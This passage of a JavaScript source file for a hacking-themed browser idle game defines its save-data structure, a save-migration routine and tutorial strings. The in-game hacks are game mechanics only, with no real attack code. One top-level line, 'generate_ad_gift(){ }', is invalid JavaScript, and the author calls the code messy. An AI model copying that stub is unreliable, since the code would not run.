/*======================================================================================================
\\\        //\\        ///  ///\\\      ||||||||    |||\\     ||| ||||||||||| |||\\     |||   |||||||||
 \\\      ///\\\      ///  ///  \\\     |||    |||  ||| \\    |||     |||     ||| \\    ||| |||
  \\\    ///  \\\    ///  ///    \\\    |||    |||  |||  \\   |||     |||     |||  \\   ||| |||
   \\\  ///    \\\  ///  ///======\\\   ||||||||    |||   \\  |||     |||     |||   \\  ||| |||    ||||
    \\\///      \\\///  ///        \\\  |||   |||   |||    \\ |||     |||     |||    \\ ||| |||      ||
     \\//        \\//  ///          \\\ |||    |||  |||     \\||| ||||||||||| |||     \\|||   |||||||||
========================================================================================================
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Hot spaghetti and lasagna code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

Game designed and programmed by: @MangoFlavor.
Twitter: @MangoFlavor115
Facebook: pffft.
Instagram: pffft x2.
TikTok: No.

libraries used:
-Jquary
--augmented-ui

Code should be rewritten as i learn more about coding design patterns,
I know there is a lot of repetition, bad naming, and wasted operations, and so on...
However I focused on getting something actually to work and publish it,
since it is a waste of time to try and make good code while i don't know how to do it, yet!.
Have fun reading :)!

Find save file size
var _lsTotal=0,_xLen,_x;for(_x in localStorage){ if(!localStorage.hasOwnProperty(_x)){continue;} _xLen= ((localStorage[_x].length + _x.length)* 2);_lsTotal+=_xLen; console.log(_x.substr(0,50)+" = "+ (_xLen/1024).toFixed(2)+" KB")};console.log("Total = " + (_lsTotal / 1024).toFixed(2) + " KB");
*/

/**
 * Recursively adds missing keys from the original object to the game object.
 * If a key in the original object is not present in the game object, the function
 * adds the key and its nested keys (if any) to the game object.
 * 
 * @param {Object} original - The original object to compare against.
 * @param {Object} game - The game object to add missing keys to.
 */
function addMissingKeys(original, game) {
  // Loop over all keys in the original object
  for (let key in original) {
    // Check if the key is not present in the game object
    if (!game.hasOwnProperty(key)) {
      // If the value associated with the key is an object, handle it recursively
      if (typeof original[key] === 'object' && original[key] !== null) {
        // If the value is an array, create a new empty array in the game object
        if (Array.isArray(original[key])) {
          game[key] = []
          addMissingKeys(original[key], game[key]) // Recursively add missing keys to the nested array
        } else if (original[key] instanceof Map) { // If the value is a Map, create a new Map in the game object
          game[key] = new Map(original[key])
        } else { // If the value is a regular object, create a new empty object in the game object
          game[key] = {}
          addMissingKeys(original[key], game[key]) // Recursively add missing keys to the nested object
        }
      } else {
        // If the value is not an object, copy it from the original object to the game object
        game[key] = original[key]
      }
    } else if (typeof original[key] === 'object' && original[key] !== null) {
      // If the key is already present in the game object and the value is an object, handle it recursively
      if (Array.isArray(original[key])) {
        addMissingKeys(original[key], game[key]); // Recursively add missing keys to the nested array
      } else if (original[key] instanceof Map && !(game[key] instanceof Map)) { // If the value is a Map, make sure the game object also has a Map at this key
        game[key] = new Map(original[key])
      } else {
        addMissingKeys(original[key], game[key]); // Recursively add missing keys to the nested object
      }
    }
  }
}
var CGEnvironment;
var in_ad;
generate_ad_gift(){
	
}
/*
*/
function removeExtraKeys(original, game) {
  for (let key in game) {
    if (original.hasOwnProperty(key)) {
      if(typeof(original[key]) == "object") {
      	if (Array.isArray(original[key])) {
      		continue
      	}
      	else{
      		removeExtraKeys(original[key], game[key])
      	}
      }
    }
    else {
    	delete game[key]
    }
  }
}

//to update game data on local machine when adding new keys to Game object.
function update_save_file() {
	addMissingKeys(ORIGINAL_DATA, Game)
	removeExtraKeys(ORIGINAL_DATA, Game)

	//this for patch 0.9.9.95 from 0.9.9.91
	if(Game.VERSION == "BETA 0.9.9.91") {
		temp_format_cps_multi = Math.pow(Game.permanent.total_credit_generated / 50000000, 1/3);
		if(Math.floor(temp_format_cps_multi-Game.permanent.format_cps_multi*100))
			Game.permanent.format_cps_multi = Math.floor(Math.pow(Game.permanent.total_credit_generated / 50000000, 1/3)/100)
	}
	
	//update version
	Game.VERSION = VERSION
	recal_software_effects()
	recal_achievement()
}

var
VERSION = "BETA 0.97.1.0",
ORIGINAL_DATA = {},
autoSave_cycle = 180, // 3mins
isLogin = false,
save = true,
isFormatting = false,
//Save file
Game = {
	_V1VCK_: 0, //key for validation when Importing save file, it checks if this key exist
	VERSION: VERSION,
	screen: {
		width: 0,
		height: 0
	},
	permanent: {
		//general
	file_name: "",
	file_creation_date: 0,
	file_last_time_played: 0,
	settings: {
		sys_color: "green",
		idle_report: true,
		auto_reset_menus: true,
		font_size: 100
	},
	data: 0,
	materials: 0,
	console_filter: "cnsl_all",
	show_updates: false,
	auto_block: false,
	auto_install: false,
	//events
	events: {
		CPU_100: false, //first time CPU reaches 100%+
		GPU_100: false, //first time GPU reaches 100%+
		RAM_0: false, //first time RAM reaches 0-
		HEAT_0: false, //first time HEAT reaches 0-
		HEAT_50: false, //first time HEAT reached 50+
		HEAT_95: false, //first time HEAT reaches 95+
		HARDWARE: false, //first time total_hardware reaches 10+
		SOFTWARE: false, //first time total_software reaches 3+
		OPEN_FORMAT: false, //first time opening Format menu
		OPEN_ACHIEVEMENTS: false, //first time opening achievements menu
		BOT_WHEREHOUSE: false, //first time opening Bot manager > Waharehouse page
		BOT_ASSEMBLE: false, //first time opening Bot manager > Assemble page
		BOT_PROCEDURE: false, //first time opening Bot manager > PROCEDURE page
		BOT_PRODUCTION: false, //first time opening Bot manager > PRODUCTION page
		STORE0: false, //first time Unlocking Store hardware_count.h6 reaches 1+
		STORE_HQ: false, //first time opening Store > HQ page
		STORE_OL: false, //first time opening Store > ONLINE page
		GAIA_FIRST_HACK: false, //first time G.A.I.A Hack attempt total_gaia_hack reaches 1+
		GAIA_FIRST_HACKED: false, //first time HACKED by G.A.I.A total_gaia_hacked reaches 1+
		GAIA_FIRST_BLOCK: false, //first time Blocking G.A.I.A total_gaia_blocked reaches 1+
		FIRST_BLOCKER: false, //first time seeing blocker
		FIRST_CRACK_PASSWORD: false, //first time seeing crack password
		FIRST_FAKE_CERTIFICATE: false, //first time seeing fake certificate
		FIRST_FORMAT: false, //first time formatting
		BUYING_3FAN: false, //after buying first 3 fans
		IDLE_0: false //first time returing from Idle
	},
	//bot manager
	bots: {
		support_1: 3,
		support_2: 0,
		support_3: 0,
		scrapping_1: 5,
		scrapping_2: 0,
		scrapping_3: 0,
		recycling_1: 0,
		recycling_2: 0,
		recycling_3: 0,
		mining_1: 0,
		mining_2: 0,
		mining_3: 0,
		casting_1: 0,
		casting_2: 0,
		casting_3: 0,
		exploring_1: 0,
		exploring_2: 0,
		exploring_3: 0,
		scout_1: 5,
		scout_2: 0,
		scout_3: 0,
		cargo_1: 0,
		cargo_2: 0,
		cargo_3: 0,
		battle_1: 5,
		battle_2: 0,
		battle_3: 0,
		missile_1: 0,
		missile_2: 0,
		missile_3: 0,
		mega_1: 0,
		mega_2: 0,
		mega_3: 0,
		sentry_1: 0,
		sentry_2: 0,
		sentry_3: 0,
		laserbeam_1: 0,
		laserbeam_2: 0,
		laserbeam_3: 0,
		wallking_1: 0,
		wallking_2: 0,
		wallking_3: 0
	},
	auto_clicker_assigned: {
		support_1: 0,
		support_2: 0,
		support_3: 0,
	},
	network_listener_assigned: {
		support_1: 0,
		support_2: 0,
		support_3: 0,
	},
	auto_pressing_assigned: {
		support_1: 0,
		support_2: 0,
		support_3: 0,
	},
	auto_addition_assigned: {
		support_1: 0,
		support_2: 0,
		support_3: 0,
	},
	auto_sequencer_assigned: {
		support_1: 0,
		support_2: 0,
		support_3: 0,
	},
	scrapping_assigned: {
		scrapping_1: 0,
		scrapping_2: 0,
		scrapping_3: 0,
	},
	recycling_assigned: {
		recycling_1: 0,
		recycling_2: 0,
		recycling_3: 0,
	},
	mining_assigned: {
		mining_1: 0,
		mining_2: 0,
		mining_3: 0,
	},
	casting_assigned: {
		casting_1: 0,
		casting_2: 0,
		casting_3: 0,
	},
	exploring_assigned: {
		exploring_1: 0,
		exploring_2: 0,
		exploring_3: 0,
	},

	auto_clicker_max_energy: 5,
	network_listener_max_energy: 5,
	auto_pressing_max_energy: 5,
	auto_addition_max_energy: 5,
	auto_sequencer_max_energy: 5,
	auto_clicker_base_effect: 10,
	network_listener_base_effect: 0.5,
	auto_pressing_base_effect: 5,
	auto_addition_base_effect: 5,
	auto_sequencer_base_effect: 5,
	scrapping_max_energy: 50,
	recycling_max_energy: 50,
	mining_max_energy: 50,
	casting_max_energy: 50,
	exploring_max_energy: 50,
	scrapping_base_effect: 1,
	recycling_base_effect: 1,
	mining_base_effect: 1,
	casting_base_effect: 1,
	exploring_base_effect: 1,

	//general tracking
	achievementsMulti: 0,
	unlocked_achievement: [],
	total_achievements: 0,
	total_time_played: 0,
	total_clicks: 0,
	total_credit_from_clicks: 0,
	total_credit_generated: 0,
	total_credit_spent: 0,
	total_contribution_points: 0,
	total_credit_generated_tasks: 0,
	total_data_generated_tasks: 0,
	//pressing
	total_pressing_task_complated: 0,
	total_credit_generated_from_pressing_task: 0,
	total_data_generated_from_pressing_task: 0,
	total_hard_pressing_task_complated: 0,
	//addition
	total_add_task_complated: 0,
	total_credit_generated_from_add_task: 0,
	total_data_generated_from_add_task: 0,
	total_hard_add_task_complated: 0,
	//sequence
	total_sequence_task_complated: 0,
	total_credit_generated_from_sequence_task: 0,
	total_data_generated_from_sequence_task: 0,
	total_hard_sequence_task_complated: 0,

	total_data: 0,
	total_crown_coin_collected: 0,
	total_formats: 0,
	total_hq_purchases_count: 0,
	total_ol_purchases_count: 0,
	total_materials_generated: 0,
	total_tier_1_reward_gained: 0,
	total_tier_2_reward_gained: 0,
	total_tier_3_reward_gained: 0,
	total_tier_4_reward_gained: 0,
	total_tier_5_reward_gained: 0,

	//format
	format_cps_multi: 0,
	total_data_in_last_format: 0,
	unlocked_format: [],
	hibernate_duration: 0,
	offline_credit_multi: 0,
	offline_data_multi: 0,
	offline_materials_multi: 0,
	keyboard_Mode: 0,
	keyboard_conversion: 0,
	mouse_Mode: 0,
	mouse_conversion: 0,
	chair_Mode: 0,
	chair_conversion: 0,
	desk_Mode: 0,
	desk_conversion: 0,
	monitor_Mode: 0,
	monitor_conversion: 0,
	router_Mode: 0,
	router_conversion: 0,
	pc_Mode: 0,
	pc_conversion: 0,
	solar_power_Mode: 0,
	solar_power_conversion: 0,
	magnetic_generator_Mode: 0,
	magnetic_generator_conversion: 0,
	radio_tower_Mode: 0,
	radio_tower_conversion: 0,
	radar_dish_Mode: 0,
	satellite_Mode: 0,
	software_engineering: 1,
	hardware_engineering: 1,
	resources: 0,
	hq_prices_discount: 1,
	ol_prices_discount: 1,
	ol_timer_reduce: 0,

	//gaia
	gaia_difficulty: 0,
	total_gaia_hack: 0,
	total_gaia_hacked: 0,
	total_gaia_blocked: 0,
	total_easy_hack_blocked: 0,
	total_normal_hack_blocked: 0,
	total_hard_hack_blocked: 0,
	total_impossible_hack_blocked: 0,
	total_blocker_blocked: 0,
	total_face_certificate_blocked: 0,
	total_crack_password_blocked: 0
	},
	impermanent: {
		ad_gift_type: "hardware",
		ad_gift: "h1",
		gift_icon: "keyboard",
		gift_text: "x1 keyboard",
		ad_gift_taken: false,
		ad_gift_timer: 300,
		events: {
			NEW_ACC0: false
		},
		//general
		game_close_time: 0,
		credit: 0,
		threat: 0,
		task: "task1",
		heatU: 9,
		current_crown_cycle: 900,
		no_effect: 0,
		total_hardware: 0,
		total_software: 0,
		//software
		fire_wall: 0.1,
		  //dps
	  dps_multi: 1,
	  dps_multi_thread: 1,
	  dps_total_multi: 1,
		dps_filtering_multi: 0,
		dps_analysis_multi: 0,
		dps_sorting_multi: 0,
			//crown coin
		crown_cycle_multi: 0, 
		crown_effect_duration_multi: 0,
		crown_coin_visibility_appearance: 0,
		crown_effect_multi: 0,
		  //hardware
		keyboardMulti: 1,
		mouseMulti: 1,
		chairMulti: 1,
		deskMulti: 1,
		monitorMulti: 1,
		routerMulti: 1,
		pcMulti: 1, 
		solarMulti: 1,
		mag_genMulti: 1,
		radio_tower_Multi: 1,
		radar_dish_Multi: 1,
		satellite_Multi: 1,
		hardware_in_list: ["h1", "h2", "h3", "h4", "h5", "h6", "h7"],
		hardware_count: {"h1": 0, "h2": 0, "h3": 0, "h4": 0, "h5": 0, "h6": 0, "h7": 0, "h8": 0, "h9": 0, "h10": 0,
		"h11": 0, "h12": 0},
		software_in_list: [],
		  //click
		click_multi: 1,
		click_add: 0,
		clicktinuum: 0,
		  //total multi
		computing: 0,
		frequency: 0,
		and_gate: 0,
		or_gate: 0,
		not_gate: 0,
		nand_gate: 0,
		nor_gate: 0,
		xor_gate: 0,
		nxor_gate: 0,
		total_multi: 1,
		  //tasks multi
		pressing_task_multi: 1,
		pressing_task_infinite_keys: 0,
		add_task_multi: 1,
		add_task_overflow: 0,
		sequence_task_multi: 1,
		sequence_task_chaining: 0,
		unlocked_software: new Map(),

		//gaia
		g_eff: {
			coin_credit: 1,
			coin_data: 1,
			coin_click: 1,
			gaia_credit: 1,
			gaia_data: 1,
			gaia_click: 1,
			gaia_materials: 1,
			gaia_network: 1,
			gaia_energy: 1,
			ad_credit: 1,
			ad_data: 1,
			effects: []
		},
		gaia_attack_cycle: 0,

		//hq
		hq_purchases_count: 0,
		hq_item_price: 10000,
		hq_cpu: 0,
		hq_gpu: 0,
		hq_ram: 0,
		hq_heat: 0,
		//ol
		ol_purchases_count: 0,
		ol_items_limit: 2,
		dl_items: [],

		ol_cpu_inc: 0, //ol cpu increase
		ol_cpu_con: 0, //ol cpu consumption
		ol_gpu_inc: 0, //ol gpu increase
		ol_gpu_con: 0, //ol gpu consumption
		ol_ram_inc: 0, //ol ram increase
		ol_ram_con: 0, //ol ram consumption
		ol_heat_inc: 0, //ol heat increase
		ol_heat_con: 0, //ol heat consumption
		//online store multis
		ol: {
			CPU: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			GPU: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			RAM: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			FAN: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Keyboard: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Mouse: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Chair: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Desk: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Monitor: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Router: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			PC: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"Solar power": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Generator: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"Radio tower": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"Radar dish": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Satellite: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Computing: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Frequency: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"AND Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"OR Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"NOT Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"NAND Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"NOR Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"XOR Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"NXOR Gate": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Click: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			"Click mode": {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Pressing: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Add: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Sequence: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Credit: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Data: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Filtering: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Analysis: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
			Sorting: {
				multi: 1,
				cpu: 0,
				gpu: 0,
				ram: 0,
				heat: 0
			},
		},

		ol_unlocked: false,
		online_store_cycle: 0, //3mins, to reafresh items
		ol_items: [],
		//Tasks
		current_contribution_points: 0, // all task progress of 100
		tasks_rewards: {
			tier_1: {
				collected: true,
				reward: 0
			},
			tier_2: {
				collected: true,
				reward: 0
			},
			tier_3: {
				collected: true,
				reward: 0
			},
			tier_4: {
				collected: true,
				reward: 0
			},
			tier_5: {
				collected: true,
				reward: 0
			}
		},

		credit_generated_from_pressing_task: 0,
		data_generated_from_pressing_task: 0,
		credit_generated_from_add_task: 0,
		data_generated_from_add_task: 0,
		credit_generated_from_sequence_task: 0,
		data_generated_from_sequence_task: 0
	}
},

//orgiginal copy of game
ORIGINAL_DATA = deepCopy(Game),
b_crredit = 0,
b_data = 0,
b_materials = 0,

idle_time = 0,
idle_credit = 0,
idle_data = 0,
idle_materials = 0,
idle_hack = 0,
idle_block = 0,
idle_threat = 0,

//tutorial events
tutorial = {
	console: {
		text: "All kinds of messages will be desplayed here, keep track of all messages from the System or from other sources",
		top: 26,
		left: 15.5,
		arrow: 2,
		next: "clicker"
	},
	clicker: {
		text: "Click here to generate Credit",
		top: 26,
		left: 46,
		arrow: 2,
		next: "hardwares"
	},
	hardwares: {
		text: "To Buy Hardwares you need Credit currency, buying Hardwares will increase your CPS (Credit Per Second). Some Hardwares enhance other functionalities of the System",
		top: 46,
		left: 26,
		arrow: 1,
		next: "softwares0"
	},
	softwares0: {
		text: "Softwares will unlock automatically while progressing, buying Softwares will updrade different functionalities of the System",
		top: 46,
		left: 26,
		arrow: 1,
		next: "quick_info0"
	},
	quick_info0: {
		text: "Here you can Keep track of all resources and their status, be careful, low resources will lead to poor System performance",
		top: 0,
		left: 26,
		arrow: 1,
		next: "quick_info1"
	},
	quick_info1: {
		text: "CPU, GPU, RAM, and Heat are the main 4 resources, keep all of them in a good balance for maximum performance",
		top: 0,
		left: 26,
		arrow: 1,
		next: "quick_info2"
	},
	quick_info2: {
		text: "When Heat reaches 95+&#8451; or 0-&#8451;, the System will be overheated/over-cooled, causing one random Hardware to fail for every interval, keep heat balanced",
		top: 0,
		left: 26,
		arrow: 1,
		next: "effect0"
	},
	effect0: {
		text: "Keep track of all currently applied effects here. Click here to pin the effects list to be able to scroll the list if needed",
		top: 14,
		left: 27.5,
		arrow: 2,
		next: "tasks0"
	},
	tasks0: {
		text: "Tasks are optional way for earning Credit or Data, choose a Task and set the difficulty then start completing them",
		top: 46,
		left: 27,
		arrow: 3,
		next: "tasks1"
	},
	tasks1: {
		text: "On collecting 10, 25, 40, 55, or 100 contribution points, you can collect bigger rewards from HQ, these rewards are repeatable for as long as you do Tasks",
		top: 46,
		left: 27,
		arrow: 3,
		next: "tasks2"
	},
	tasks2: {
		text: "Toggle between Resum/Pause to indicate whether inputs should be counted as Tasks inputs or not",
		top: 46,
		left: 27,
		arrow: 3,
		next: "ads"
	},
	ads: {
		text: "Watch Ads here and get rewarded, either with global CPS/global DPS Multipliers, or with other items, Please disable AD blocker if you want to benefit from it",
		top: 12,
		left: 27,
		arrow: 3,
		next: "none"
	},
	fans_0: {
		text: "Be Careful, When Heat reaches less than 0&#8451;, the system will be over-cooled, causing one random Hardware to fail for every interval",
		top: 51,
		left: 41.5,
		arrow: 0,
		next: "fans_1"
	},
	fans_1: {
		text: "Fans can not be sold, to heat up the System, install anything that rises Heat. So make sure to only buy Fans when needed",
		top: 51,
		left: 41.5,
		arrow: 0,
		next: "fans_2"
	},
	fans_2: {
		text: "Otherwise Hardwares will continue to fail, and you might be forced to format the System",
		top: 51,
		left: 41.5,
		arrow: 0,
		next: "none"
	},
	heat_0: {
		text: "Be Careful, When Heat reaches less than 0&#8451;, the System will be over-cooled, causing one random Hardware to fail for every interval",
		top: 0,
		left: 26,
		arrow: 1,
		next: "heat_1"
	},
	heat_1: {
		text: "Try to maintain balanced Heat, Otherwise Hardwares will continue to fail, and you might be forced to format the System",
		top: 0,
		left: 26,
		arrow: 1,
		next: "none"
	},
	heat_2: {
		text: "Reminder!, When Heat reaches 95+&#8451;, the System will be over-heated, causing one random Hardware to fail for every interval",
		top: 0,
		left: 26,
		arrow: 1,
		next: "heat_3"
	},
	heat_3: {
		text: "Try to maintain balanced Heat, Otherwise Hardwares will continue to fail, and you might be forced to format the System",
		top: 0,
		left: 26,
		arrow: 1,
		next: "none"
	},
	heat_4: {
		text: "Be Careful, When Heat reaches 95+&#8451;, the System will be over-heated, causing one random Hardware to fail for every interval",
		top: 0,
		left: 26,
		arrow: 1,
		next: "heat_5"
	},
	heat_5: {
		text: "Try to maintain balanced Heat, Otherwise Hardwares will continue to fail, and you might be forced to format the System",
		top: 0,
		left: 26,
		arrow: 1,
		next: "none"
	},
	store_0: {
		text: "Check the Store to buy CPU, GPU, RAM, and FAN",
		top: 0,
		left: 26,
		arrow: 1,
		next: "none"
	},
	store_1: {
		text: "In HQ store, you can buy CPU, GPU, RAM, or FAN, these items will help you extend System's resources power, be careful as they all share same price, so only buy what is needed the most",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	store_2: {
		text: "In Online store, you can buy and download different useful System parts or Softwares enhancers, each have its own price and download size",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "store_3"
	},
	store_3: {
		text: "Downloading multiple items at once will split Network speed among them evenly, so be careful on what to download first. Price and size will scale up on each purchase",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	achievement_0: {
		text: "In Achievements menu, you can keep track of your progress across different parts, On each milestone, you gain bonus CPS",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	ram_0: {
		text: "Be careful, RAM is required to install Softwares or anything that needs RAM, extend System's RAM as needed",
		top: 0,
		left: 26,
		arrow: 1,
		next: "store_0"
	},
	cpu_0: {
		text: "Be careful, when System's CPU reaches 100%+, DPS will be reduced",
		top: 0,
		left: 26,
		arrow: 1,
		next: "store_0"
	},
	gpu_0: {
		text: "Be careful, when System's GPU reaches 100%+, CPS will be reduced",
		top: 0,
		left: 26,
		arrow: 1,
		next: "store_0"
	},
	format_0: {
		text: "Using the collected data from G.A.I.A, we can enhance the System with new technologies, Keep in mind that you need to Format the System to gain the new technologies",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	bot_0: {
		text: "Warehouse is where all assembled bots are, keep track of each bot type individually",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	bot_1: {
		text: "Assembling a bot require Materials, to assemble a bot, click on its icon",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "bot_2"
	},
	bot_2: {
		text: "Automation bots require Energy to function, while other types do not. Bots stats are Energy, Hit points, Fire power, and Cargo capacity",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	bot_3: {
		text: "Each Production method require specific bot type, and each have its own maximum Energy consumption",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "bot_4"
	},
	bot_4: {
		text: "To assign/withdraw a bot into a Production method, click on its icon in its related Production method, then click on assign/withdraw button",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	bot_5: {
		text: "All Procedure require the same bot type, and each have its own maximum Energy consumption",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "bot_6"
	},
	bot_6: {
		text: "To assign/withdraw a bot into a Procedure method, click on its icon in its related Procedure method, then click on assign/withdraw button",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	},
	idle_0: {
		text: "While in Idle state, G.A.I.A will continue its HACK attempts, 'Auto block' is automatically activated, HACK block is based on Firewall's block chance rate",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "idle_1"
	},
	idle_1: {
		text: "When Threat reaches 100% while in Idle, the System will be Locked by G.A.I.A, and all resources will stop generating",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "idle_2"
	},
	idle_2: {
		text: "While in Idle state, Heat will not effect the system and it will not rise or cooldown, and the System will continue to generate resources normally",
		top: 50,
		left: 26.5,
		arrow: 0,
		next: "none"
	}
},

//all timers ids are created dynamicly, and pushed to an array. Why? to clear all of them when game reset.
timers_IDs = [],

//g_eff_timer
g_eff_t_isruniing = false,
g_eff_timer = 0,
g_eff_clicked = false,

//makesure
makesure = "",

//settings
modify_acc = false,

//hardwares cps
keyboard_cps = 0,
mouse_cps = 0,
chair_cps = 0,
desk_cps = 0,
monitor_cps = 0,
router_cps = 0,
pc_cps = 0, 
solar_cps = 0,
mag_gen_cps = 0,
radio_tower_cps = 0,
radar_dish_cps = 0,
satellite_cps = 0,

//attack
is_attack = false,
attack_timer = 0,
auto_block = false,
//time
time = 0,
active_clock = 0, // setTimeout ID when tab have Focus
session_time = 0,
start = 0,
old_clock = 0,
idle_start = 0, //reset to new Date().getTime() when idle
time_diff = 0,
time_elapsed = 0,
  //cps cycle
gpu_eff = 0, // cps *= gpu_eff ==> effected by gpu usage > 100+;
  //heat cycle
heat_cycle = 10, // 10s>10000ms
heat_tick_div = 1, // heatTick /= heatTickDiv;
  //online store cycle
online_store_tick = 1, // 1s>1000ms
online_store_tick_div = 1,
mins, // for online store
seconds, // for online store

//console
cnsl_all = [],

//click
click_base = 1,
click_total = 0, //what you gain when clicking
cpu_eff = 0, // dps *= cpu_eff ==> effected by cpu usage >100+;
old_clicks_ps = 1, // set to current_click_ps every second
current_click_ps = 1, // +1 on every click in cilck program
click_ratio = 0, //number of clicks per seconds = old+current/2

//sys
base_dps = 1,
dps = 0,
cps = 0,
nps = 0,

//ad
ad_btn = "",

//achievements
total_credit_in_one_session = 0,
total_data_in_one_session = 0,
total_materials_in_one_session = 0,


//resources M>Max, R>reduce, I>increase, U>current final uasge to be displayed
  //========CPU===========
base_cpu = 1, //when game start
hard_cpu_con = 0, //Hardware cpu consumption
soft_cpu_con = 0, //Software cpu consumption
hq_cpu_inc = 0, //hq cpu increase
hq_cpu_con = 0, //hq cpu consumption
cpuM = 100, //Max cpu to reach before dbuff is active (100%)
cpuU = 1, //what will bw shown in System_menu
total_cpu_inc = 0,
total_cpu_con = 0,

  //========GPU===========
base_gpu = 0,
hard_gpu_con = 0, //Hardware gpu consumption
soft_gpu_con = 0, //Software gpu consumption
hq_gpu_inc = 0, //hq gpu increase
hq_gpu_con = 0, //hq gpu consumption
gpuM = 100, //Max gpu to reach before dbuff is active (100%)
gpuU = 0, //what will bw shown in System_menu
total_gpu_inc = 0,
total_gpu_con = 0,

  //========RAM===========
base_ram = 20,
hard_ram_con = 0, //Hardware ram consumption
soft_ram_con = 0, //Software ram consumption
hq_ram_inc = 0, //hq ram increase
hq_ram_con = 0, //hq ram consumption
ramU = 20, //what will bw shown in System_menu
total_ram_inc = 0,
total_ram_con = 0,

  //========HEAT===========
base_heat = 9,
hard_heat_con = 0, //Hardware heat consumption
soft_heat_con = 0, //Software heat consumption
hq_heat_inc = 0, //hq heat increase
hq_heat_con = 0, //hq heat consumption
total_heat_inc = 0,
total_heat_con = 0,
heatM = 95, //Maximum heat before dbuff is active (95c)
heatCM = 0, //Minmum heat before dbuff is active (0C)
heatHA = 1, //Heat Amout to add each heatTick
heatHAM = 1, //Heat Amout Multiplier
heatCA = 0.5, //Cool Amount to add each heatTick
heatCAM = 1, //Cool Amount Multiplier
heatMU = 9, //Max Usage amout to reach after calculation

//crown_coin
crown_coin_duration = 0, //to be set when crown_coin_cycle is 0
coin_type = 0, //credit, data, click
coin_level = 0, //effect level

//menu selection
oldmenu = "system_manager_menu",
newmenu = "system_manager_menu",
old_main_icon = "hardware_menu_icon",
new_main_icon = "hardware_menu_icon",
//items selection
item_oldsel = "h1", 
item_newsel = "h1",
s_oldsel = "s1h1", 
s_newsel = "s1h1",
s_mouseX = 0,
s_mouseY = 0,
c_mouseX = 0, 
c_mouseY = 0,  
clicked = "",

//h-s menu
h_bundle_old = "h_bundle_1",
h_bundle_new = "h_bundle_1",
h_bundle = 1,
h_s_osel = "h_section",
h_s_nsel = "h_section",

//task selection
moldsel = "task1",
mnewsel = "task1",
task_isPauseed = false,

//sys selection
sysoldsel = "res_btn",
sysnewsel = "res_btn",

//console task mode
activeTask,
task,
task_progress = 0, // current task progress of 100

//store menu
soldsel = "hq",
snewsel = "hq",
hq_bundle_old = "hq_bundle_1",
hq_bundle_new = "hq_bundle_1",
hq_bundle = 1,

//simple Numbers
simpleNumberL = ["", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", 
